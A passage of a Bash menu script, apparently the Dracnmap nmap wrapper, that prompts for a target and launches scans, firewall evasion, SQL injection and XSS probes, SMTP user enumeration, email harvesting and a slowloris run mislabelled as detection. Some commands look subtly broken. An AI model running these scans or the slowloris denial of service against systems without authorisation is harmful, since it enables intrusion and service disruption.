echo "    )   *           (      (         (   (   (            ";
echo " ( /( (  \     (     )\ )   )\ )  (   )\ ))\ ))\ )  *   )  ";
echo " )\()))\))(   )\   (()/(  (()/(  )\ (()/(()/(()/(\  )  /(  ";
echo "((_)\((_)()((((_)(  /(_))  /(_)|((_) /(_))(_))(_))( )(_)) ";
echo " _((_|_()((_)\ _ )\(_))   (_)) )\___(_))(_))(_)) (_(_())  ";
echo "| \| |  \/  (_)_\(_) _ \  / __((/ __| _ \_ _| _ \|_   _|  ";
echo "| .\ | |\/| |/ _ \ |  _/  \__ \| (__|   /| ||  _/  | |    ";
echo "|_|\_|_|  |_/_/ \_\|_|    |___/ \___|_|_\___|_|    |_|    ";
echo "                                                          ";
echo -e $red"  Nmap Script Engine - Advanced Scanning with Nmap Script "

				echo -e $white " "
				echo -e $white"	[$okegreen"01"$white]$cyan  auth-category  "
				echo -e $white"	[$okegreen"02"$white]$cyan  broadcast-category "
				echo -e $white"	[$okegreen"03"$white]$cyan  brute-category "
				echo -e $white"	[$okegreen"04"$white]$cyan  exploit-category "
				echo -e $white"	[$okegreen"05"$white]$cyan  fuzzer-category "
				echo -e $white"	[$okegreen"06"$white]$cyan  malware-category "
				echo -e $white"	[$okegreen"07"$white]$cyan  vuln-category "
				echo -e $white"	[$okegreen"08"$white]$cyan  back to menu "
				echo
				echo -n -e $red'  \033[4mScreetsec@nse:\033[0m>> '; tput sgr0 #insert your choice
		      	read ceh
		          if test $ceh == '1'
		          	then
								clear
								auth
		          	elif test $ceh == '2'
		           		then
		           		clear
									brd
		              elif test $ceh == '3'
		                then
										clear
										brutense
		              elif test $ceh == '4'
		                then
											clear
											exploit
		            elif test $ceh == '5'
		                then
											clear
											fuzzer
										elif test $ceh == '6'
		                	then
		                	echo
											clear
											malware
										elif test $ceh == '7'
											then
											echo
											clear
											vuln
									elif test $ceh == '8'
										then
										 menu
									else
											echo ""
											echo -e $okegreen " Incorrect Number"
										fi
											 echo ""
											 echo ""
											 echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
									read back
									if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
											then
											clear
											menu
									elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
											then
											nse
									fi
						}

################################################
# PING PING BEBEB
################################################
function pingbebeb() {
  echo -e $okegreen " "
  clear
  echo " "
  echo "                "
  echo ""
  echo "          \|/  "
  echo "         .-*-   "
  echo "        / /|\     "
  echo "       _L_         "
  echo "     ,     .         "
  echo -e $okegreen" (\ /  O O  \ /)  $red ______ _______ _______ _______      __ __      "
  echo -e $okegreen"  \|    _    |/   $red |   __ \_     _|    |  |     __|    |  |  |     "
  echo -e $okegreen"    \  (_)  /     $red |    __/_|   |_|       |    |  |    |__|__|   "
  echo -e $okegreen"    _/.___,\_     $red |___|  |_______|__|____|_______|    |__|__|    "
  echo -e $okegreen"   (_/ alf \_)         "
    echo -e $white " "
    echo -e $white"	[$okegreen"01"$white]$cyan  BROADCAST PING  "
    echo -e $white"	[$okegreen"02"$white]$cyan  TCP SYN PING SCANS "
    echo -e $white"	[$okegreen"03"$white]$cyan  TCP ACK PING SCANS "
    echo -e $white"	[$okegreen"04"$white]$cyan  UDP PING SCANS "
    echo -e $white"	[$okegreen"05"$white]$cyan  ICMP PING SCANS "
    echo -e $white"	[$okegreen"06"$white]$cyan  IP PROTOCOL PING SCANS "
    echo -e $white"	[$okegreen"07"$white]$cyan  BACK  "
    echo -e " "
    echo -n -e $red'  \033[4mScreetsec@PING!:\033[0m>> '; tput sgr0 #insert your choice
             read DrS

           if test $DrS == '1'
        	  then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
           	  read ip
          	  $xterm --script broadcast-ping --script-args broadcast-ping.num_probes=5 $ip &
                  pingbebeb
           elif test $DrS == '2'
               	  then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
           	  read ip
          	  $xterm -sP -PS $ip &
                  pingbebeb
           elif test $DrS == '3'
                  then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
                  read ip
                  $xterm -sP -PA $ip &
                  pingbebeb
            elif test $DrS == '4'
                  then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
                  read ip
                  $xterm -sP -PU $ip &
                  pingbebeb
            elif test $DrS == '5'
            		then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
                  read ip
                  $xterm -sP -PE $ip &
                  pingbebeb
            elif test $DrS == '6'
               	  then
                  echo -e $cyan""
                  echo -n "  What is your IP Target or Host: " ; tput sgr0
                  read ip
                  $xterm  -sP -PO --packet-trace $ip  &
                  pingbebeb
            elif test $DrS == '7'
              then
              menu
       			else
                echo ""
       			  	echo -e $okegreen " Incorrect Number"
        			fi
              echo ""
              echo ""
        			echo -n -e $cyan " Back to Last Menu? ( Yes / No ) :"
       			read back
       			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
       					then
       					clear
       					menu
       			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
       					then
       					pingbebeb
       			fi
       }



###############################################
# ZENMAP
###############################################
function zenmapscript() {
clear
clear
echo ""
echo -e $okegreen" ===================================================================="
echo -e $cyan""
echo "           +--^----------,--------,-----,--------^-, "
echo -e "           | $red |||||||||   --------      |         O "
echo -e $cyan"           +---------------------------^----------| "
echo -e $cyan"            \_,---------,---------,--------------' "
echo -e "              / $red"XXXXXX"$cyan /'|       /' "
echo -e "             / $red"XXXXXX"$cyan /   \    /' "
echo -e "            / $red"XXXXXX"$cyan / _______/ "
echo -e "           / $red"XXXXXX"$cyan / "
echo -e "           / $red"XXXXXX"$cyan / "
echo "           (________(   "
echo -e "            ------'        $red DOUBLE KILL !! GO GO GO !!  "
echo ""
echo -e $okegreen" ====================================================================="
echo -e $cyan "       Scanning Target with $red'advanced command  ( Zenmap Command )  "
echo -e $okegreen" ====================================================================="
echo ""
echo ""
  echo -e $white"	[$okegreen"01"$white]$cyan  ITENSE SCAN"
  echo -e $white"	[$okegreen"02"$white]$cyan  ITENSE SCAN + UDP "
  echo -e $white"	[$okegreen"03"$white]$cyan  ITENSE SCAN ALL TCP PORTS "
  echo -e $white"	[$okegreen"04"$white]$cyan  QUICK SCAN  "
  echo -e $white"	[$okegreen"05"$white]$cyan  QUICK SCAN PLUS PLUS "
  echo -e $white"	[$okegreen"06"$white]$cyan  QUICK TRACEROUT   "
  echo -e $white"	[$okegreen"07"$white]$cyan  COMPREHENSIVE SCAN [BEST]  "
  echo -e $white"	[$okegreen"08"$white]$cyan  BACK  "
	echo -e 	" "
  echo -n -e $red'  \033[4mScreetsec@Headshot:\033[0m>> '; tput sgr0 #insert your choice
      read Scanning
			if test $Scanning == '1'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xterm -T4 -A -v $ip &
			elif test $Scanning == '2'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xterm -sS -sU -T4 -A -v $ip &
			elif test $Scanning == '3'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xterm -p 1-65535 -T4 -A -v $ip &
			elif test $Scanning == '4'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xterm -T4 -F $ip &
			elif test $Scanning == '5'
				then
				echo
				echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
 				read ip
				$xterm -sV -T4 -O -F --version-light $ip &
			elif test $Scanning == '6'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: "; tput sgr0
 				read ip
				$xterm -sn --traceroute $ip &
			elif test $Scanning == '7'
				then
				echo
				echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
 				read ip
				$xterm -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip &
      			elif test $Scanning == '8'
        			then
        			menu
     			else
     			    echo ""
     			    echo -e $okegreen " Incorrect Number"
     			  fi
     			  echo ""
     			  echo ""
     			  echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
     			read back
     			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
     			    then
     			    clear
     			    menu
     			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
     			    then
     			    zenmapscript
     			fi
 }

################################################
# PSCANNING FOR WEB SERVICE
################################################
function WebService() {
  clear
echo -e $cyan ""
echo ""
  echo -e $red " __      __      ___.       _________                  .__              ";
  echo "/  \    /  \ ____\_ |__    /   _____/ ______________  _|__| ____  ____  ";
  echo "\   \/\/   // __ \| __ \   \_____  \_/ __ \_  __ \  \/ /  |/ ___\/ __ \ ";
  echo " \        /\  ___/| \_\ \  /        \  ___/|  | \/\   /|  \  \__\  ___/ ";
  echo "  \__/\  /  \___  >___  / /_______  /\___  >__|    \_/ |__|\___  >___  >";
  echo -e $okegreen
  echo " -----------------------------------------------------------------------"
  echo ""
    echo -e $white"	[$okegreen"01"$white]$cyan  DETECTING WEB APPLICATION FIREWALLS  "
    echo -e $white"	[$okegreen"02"$white]$cyan  DETECTING POSSIBLE XST VULNERABILITIES "
    echo -e $white"	[$okegreen"03"$white]$cyan  DETECTING OPEN RELAYS "
    echo -e $white"	[$okegreen"04"$white]$cyan  DETECTING BACKDOOR SMTP SERVERS "
    echo -e $white"	[$okegreen"05"$white]$cyan  DETECTING CROSS SITE SCRIPTING VULNERABILITIES  "
    echo -e $white"	[$okegreen"06"$white]$cyan  ENUMERATING USERS IN AN SMTP SERVER "
    echo -e $white"	[$okegreen"07"$white]$cyan  DETECTING WEB SERVERS VULNERABLE TO SLOWLORIS DDOS  "
    echo -e $white"	[$okegreen"08"$white]$cyan  FINDING SQL INJECTION VULNERABILITIES  "
    echo -e $white"	[$okegreen"09"$white]$cyan  CHECK IP GEOLOCATION WITH NSE  "
    echo -e $white"	[$okegreen"10"$white]$cyan  GATHERING INFORMATION FROM WHOIS (NSE)  "
    echo -e $white"	[$okegreen"11"$white]$cyan  COLLECTING VALID EMAIL ADDRES  "
    echo -e $white"	[$okegreen"12"$white]$cyan  BACK  "
    echo -e " "
    echo -n -e $red'  \033[4mScreetsec@WebService:\033[0m>> '; tput sgr0 #insert your choice
    read Scanning
    if test $Scanning == '1'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 $ip &
    elif test $Scanning == '2'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      nmap -sS -sU -T4 -A -v $ip
      $xterm -p80 --script http-methods,http-trace --script-args http-methods.retest $ip &
    elif test $Scanning == '3'
      then
      echo
      echo -ne  $okegreen" What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -sV --script smtp-open-relay -v $ip &
    elif test $Scanning == '4'
      then
      echo
      echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
      read ip
      $xterm nmap -sn $ip
      echo -e ""
      $xterm -sV --script smtp-strangeport $ip &
    elif test $Scanning == '5'
      then
      echo
      echo -ne  $okegreen" What is your IP Target or Host: "; tput sgr0
      read ip
      $xterm -p80 --script http-phpself-xss,http-unsafe-output-escaping $ip &
    elif test $Scanning == '6'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: "; tput sgr0
      read ip
      $xterm -p25 –script smtp-enum-users $ip &
    elif test $Scanning == '7'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -p80 --script http-slowloris --max-parallelism 300 $ip &
    elif test $Scanning == '8'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -p80 --script http-sql-injection $ip &
		elif test $Scanning == '9'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -Pn -p80 --script ip-geolocation-* $ip &
		elif test $Scanning == '10'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -sn --script whois-ip --script-args whois.whodb=nocache $ip &
		elif test $Scanning == '11'
      then
      echo
      echo -ne $okegreen " What is your IP Target or Host: " ; tput sgr0
      read ip
      $xterm -p80 --script http-google-email,http-email-harvest $ip &
    elif test $Scanning == '12'
      then
      menu
    else
        echo ""
        echo -e $okegreen " Incorrect Number"
      fi
      echo ""
      echo ""
      echo -n -e $red " Back to Last Menu? ( Yes / No ) :"
    read back
    if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
        then
        clear
        menu
    elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
        then
        WebService
    fi
}


#######################################################
# CREDITS
#######################################################
function credits {
clear
echo -e "
\033[31m##########################################################################\033[m
		             Credits To
\033[31m##########################################################################\033[m"
echo
echo -e $white "Special thanks to:"
echo
echo -e $red "Dracos Linux ( www.dracos-linux.org )"
echo
echo -e $okegreen "Offensive Security for the awesome OS"
echo
echo -e $green "http://www.offensive-security.com/"
echo
echo -e $yellow "http://www.kali.org/"
echo
echo -e $cyan "http://www.kitploit.com/"
echo
echo -e $white "http://www.linuxsec.org/"
echo
echo -e $okegreen "My Friend for helpme ( Boy Suganda )"
echo
echo -e $red "Big Thanks to : http://www.github.com/"
echo

}

###################################################
# Function Menu
#####################################################
function menu() {
clear
echo -e $red ""
echo "             80G08        "
echo "                8G#G@8  "
echo "                  8##0  "
echo "                   0##G8    "
echo "                     ####08 "
echo "                      8#####8   "
echo "                        G#####8   "
echo "                         8G#####8   "
echo "      #8#########0         #######8   "
echo "          8#######0          0#88#####    "
echo "            8G####8         8 8#8@@8###   "
echo "               8###        G8   8@G######   "
echo "                8##88       8     8######8    "
echo "                  G##088          80G##G080   "
echo "                    88000000008880#      000    "
echo "                          9               0 "
echo -e $okegreen"       .___                     _______                         ";
echo "     __| _/___________    ____  \      \   _____ _____  ______  ";
echo "    / __ |\_  __ \__  \ _/ ___\ /   |   \ /     \\__  \ \____  \ ";
echo "   / /_/ | |  | \// __ \\  \___/     |    \  Y Y  \/ __ \|  |_> >";
echo "   \____ | |__|  (____  /\___  >____|__  /__|_|  (____  /   __/ ";
echo "        \/            \/     \/        \/      \/     \/|__|    ";
echo ""
echo -e $cyan"    Script by           $white":" $red Edo Maland ( Screetsec ) "
echo -e $cyan"    Version             $white":" $red $Version  "
echo -e $cyan"    Codename            $white":" $red $Codename "
echo -e $cyan"    Follow me on Github $white":" $red @Screetsec "
echo -e $cyan"    Dracos Linux        $white":" $red dracos-linux.org "
echo -e $cyan ""
echo -e $okegreen"    =========================================================    ";
		echo -e $white " "
		echo -e $white"	[$okegreen"01"$white]$cyan  REGULER SCAN "
    echo -e $white"	[$okegreen"02"$white]$cyan  SCAN MULTIPLE IP ADDRESS "
		echo -e $white"	[$okegreen"03"$white]$cyan  SCAN OS VERSION AND TRACEROUTE "
    echo -e $white"	[$okegreen"04"$white]$cyan  FIND OUT IF A HOST IS PROTECTED FIREWALL  "
		echo -e $white"	[$okegreen"05"$white]$cyan  EVADING FIREWALLS "
    echo -e $white"	[$okegreen"06"$white]$cyan  PING PING !!   "
    echo -e $white"	[$okegreen"07"$white]$cyan  WEB SERVICES"
		echo -e $white"	[$okegreen"08"$white]$cyan  NMAP SCRIPT ENGINE - ADVANCED   "
		echo -e $white"	[$okegreen"09"$white]$cyan  ADVANCED NMAP SCANNINGS ( ZENMAP COMMAND ) "
		echo -e $white"	[$okegreen"10"$white]$cyan  SCANNING TARGET WITH OUTPUT FILES"
		echo -e $white"	[$okegreen"11"$white]$cyan  CREDITS  "
		echo -e $white"	[$okegreen"12"$white]$cyan  EXIT  "
		echo -e " "
		echo -n -e $red'  \033[4mScreetsec@dracmap-v2:\033[0m '; tput sgr0 #insert your choice
		read Dracnmap
		if test $Dracnmap == '1'
      then
    echo -e $cyan""
    echo -ne "  What is your IP Target or Host: " ; tput sgr0
    read ip
    $xterm  $ip &

		elif test $Dracnmap == '2'
 			then
    echo ""
    echo -ne $okegreen"  What is your IP Target or Host (1): " ; tput sgr0
    read ip1
    echo ""
    echo -ne $okegreen " What is your IP Target or Host (2): " ; tput sgr0
    read ip2
    echo ""
    echo -ne $okegreen " What is your IP Target or Host (3): " ; tput sgr0
    read ip3
    echo ""
    $xterm  $ip1 $ip2 $ip3  &

		elif test $Dracnmap == '3'
			then
        echo -e $cyan""
        echo -ne "  What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV -T4 -O -F --version-light 1  $ip &


		elif test $Dracnmap == '4'
			then
        echo -e $cyan""
        echo -ne "  What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm nmap -sA $ip &

		elif test $Dracnmap == '5'
			then
      echo -e $cyan""
      echo -ne "  What is your IP Target or Host: " ; tput sgr0
      read ip
			$xterm -sS -P0 $ip &

    elif test $Dracnmap == '6'
      then
      pingbebeb

		elif test $Dracnmap == '7'
			then
			WebService

		elif test $Dracnmap == '8'
 			then
 			nse

		elif test $Dracnmap == '9'
 			then
      zenmapscript

		elif test $Dracnmap == '10'
	     then
       scanoutput

		elif test $Dracnmap == '11'
 			then
      credits

    elif test $Dracnmap == '12'
      then
        clear
				sleep 1
				echo ""
				echo -e $yellow"[*] Thank You For Using Dracnmap  =)."
				echo ""
				echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
  fi

}

####################################################
# BANNER
####################################################
clear
echo -e $red ""
echo "             80G08        "
echo "                8G#G@8  "
echo "                  8##0  "
echo "                   0##G8    "
echo "                     ####08 "
echo "                      8#####8   "
echo "                        G#####8   "
echo "                         8G#####8   "
echo "      #8#########0         #######8   "
echo "          8#######0          0#88#####    "
echo "            8G####8         8 8#8@@8###   "
echo "               8###        G8   8@G######   "
echo "                8##88       8     8######8    "
echo "                  G##088          80G##G080   "
echo "                    88000000008880#      000    "
echo "                          9               0 "
echo -e $okegreen"       .___                     _______                         ";
echo "     __| _/___________    ____  \      \   _____ _____  ______  ";
echo "    / __ |\_  __ \__  \ _/ ___\ /   |   \ /     \\__  \ \____  \ ";
echo "   / /_/ | |  | \// __ \\  \___/     |    \  Y Y  \/ __ \|  |_> >";
echo "   \____ | |__|  (____  /\___  >____|__  /__|_|  (____  /   __/ ";
echo "        \/            \/     \/        \/      \/     \/|__|    ";
echo ""
echo -e $cyan"    Script by           $white":" $red Edo Maland ( Screetsec ) "
echo -e $cyan"    Version             $white":" $red $Version  "
echo -e $cyan"    Codename            $white":" $red $Codename "
echo -e $cyan"    Follow me on Github $white":" $red @Screetsec "
echo -e $cyan"    Dracos Linux        $white":" $red dracos-linux.org "
echo -e $cyan ""
echo -e $okegreen"    =========================================================    ";
		echo -e $white " "
		echo -e $white"	[$okegreen"01"$white]$cyan  REGULER SCAN "
    echo -e $white"	[$okegreen"02"$white]$cyan  SCAN MULTIPLE IP ADDRESS "
		echo -e $white"	[$okegreen"03"$white]$cyan  SCAN OS VERSION AND TRACEROUTE "
    echo -e $white"	[$okegreen"04"$white]$cyan  FIND OUT IF A HOST IS PROTECTED FIREWALL  "
		echo -e $white"	[$okegreen"05"$white]$cyan  EVADING FIREWALLS "
    echo -e $white"	[$okegreen"06"$white]$cyan  PING PING !!   "
    echo -e $white"	[$okegreen"07"$white]$cyan  WEB SERVICES"
		echo -e $white"	[$okegreen"08"$white]$cyan  NMAP SCRIPT ENGINE - ADVANCED   "
		echo -e $white"	[$okegreen"09"$white]$cyan  ADVANCED NMAP SCANNINGS ( ZENMAP COMMAND ) "
		echo -e $white"	[$okegreen"10"$white]$cyan  SCANNING TARGET WITH OUTPUT FILES"
		echo -e $white"	[$okegreen"11"$white]$cyan  CREDITS  "
		echo -e $white"	[$okegreen"12"$white]$cyan  EXIT  "
		echo -e " "
		echo -n -e $red'  \033[4mScreetsec@dracmap-v2:\033[0m '; tput sgr0 #insert your choice
		read Dracnmap
		if test $Dracnmap == '1'
      then
    echo -e $cyan""
    echo -ne "  What is your IP Target or Host: " ; tput sgr0
    read ip
    $xterm  $ip &

		elif test $Dracnmap == '2'
 			then
    echo ""
    echo -ne $okegreen"  What is your IP Target or Host (1): " ; tput sgr0
    read ip1
    echo ""
    echo -ne $okegreen " What is your IP Target or Host (2): " ; tput sgr0
    read ip2
    echo ""
    echo -ne $okegreen " What is your IP Target or Host (3): " ; tput sgr0
    read ip3
    echo ""
    $xterm  $ip1 $ip2 $ip3 &

		elif test $Dracnmap == '3'
			then
        echo -e $cyan""
        echo -ne "  What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm -sV -T4 -O -F --version-light 1  $ip &


		elif test $Dracnmap == '4'
			then
        echo -e $cyan""
        echo -ne "  What is your IP Target or Host: " ; tput sgr0
        read ip
        $xterm nmap -sA $ip &

		elif test $Dracnmap == '5'
			then
      echo -e $cyan""
      echo -ne "  What is your IP Target or Host: " ; tput sgr0
      read ip
			$xterm -sS -P0 $ip &

    elif test $Dracnmap == '6'
      then
      pingbebeb

		elif test $Dracnmap == '7'
			then
			WebService

		elif test $Dracnmap == '8'
 			then
 			nse

		elif test $Dracnmap == '9'
 			then
      zenmapscript

		elif test $Dracnmap == '10'
	     then
       scanoutput

		elif test $Dracnmap == '11'
 			then
      credits

    elif test $Dracnmap == '12'
      then
        clear
				sleep 1
				echo ""
				echo -e $yellow"[*] Thank You For Using Dracnmap  =)."
				echo ""
				echo -e $yellow"[*] Check Dracos Linux LFS, Penetration OS From Indonesia  =P."
        exit

 		else
			echo -e "  Incorrect Number"
			fi
			echo -n -e "  Do you want exit? ( Yes / No ) :"
			read back
			if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'no' ] && [ $back != 'No' ]
					then
					clear
					exit
			elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'yes' ] && [ $back != 'Yes' ]
					then
					menu
fi
